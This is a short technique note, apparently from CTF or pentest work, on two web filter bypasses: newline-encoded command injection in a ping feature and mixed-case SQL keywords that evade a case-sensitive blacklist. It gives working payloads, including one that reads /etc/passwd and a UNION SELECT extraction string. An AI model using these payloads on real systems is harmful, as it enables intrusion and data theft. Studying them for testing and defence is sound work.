# Web App Command Injection & SQLi Filter Bypass Patterns

## Pattern 1: Newline Injection Bypass in Network Diagnostic Tools

### Scenario
A web application's network diagnostic feature (ping test) executes commands via `sh -c "ping -c 4 <user_input>"`. The application filters common shell metacharacters (`;`, `|`, `&`, `$`, `` ` ``) but does not sanitize newline characters.

### Technique
Inject a URL-encoded newline (`%0a`) followed by the desired command:
```
POST target=127.0.0.1%0acat /etc/passwd
```
This results in the shell executing:
```sh
ping -c 4 127.0.0.1
cat /etc/passwd
```

### Detection
- Test with: `127.0.0.1%0aid` or `127.0.0.1%0Als`
- If `id` output or `ls` listing appears in response (ignoring the expected "ping: Operation not permitted" or similar), injection is confirmed.

### Applicability
- Any web app that wraps user input in a shell command (`sh -c`, `subprocess.call(shell=True)`, `os.system()`, etc.) and only filters common shell metacharacters.
- Particularly effective when the app uses blacklist-based filtering rather than proper input validation or parameterized execution.

## Pattern 2: Case-Variation SQL Keyword Filter Bypass

### Scenario
A web application filters SQL keywords using case-sensitive string matching (e.g., blocking `SELECT`, `UNION`) but SQL engines (SQLite, MySQL, PostgreSQL) treat keywords as case-insensitive.

### Technique
Use mixed-case variations of blocked keywords:
- `sElEcT` instead of `SELECT`
- `uNiOn` instead of `UNION`
- `FrOm` instead of `FROM`
- `WhErE` instead of `WHERE`

Example payload:
```
' uNiOn sElEcT 1,column1,column2,3,4 FrOm target_table--
```

### Detection
- If standard `' UNION SELECT...` returns a keyword filter error but `' OR 1=1--` works (boolean injection confirmed), try case variation.
- Verify by using `sElEcT` in a WHERE clause: `' AND (sElEcT 1)=1--` should return normal results.

### Applicability
- Any SQL injection point protected by a case-sensitive keyword blacklist.
- Particularly common in custom WAF implementations that use simple string matching instead of proper SQL parsing.

## Verification
Both patterns were verified in a CTF environment against Flask/gunicorn (Python 3.11) web applications with custom input filters.
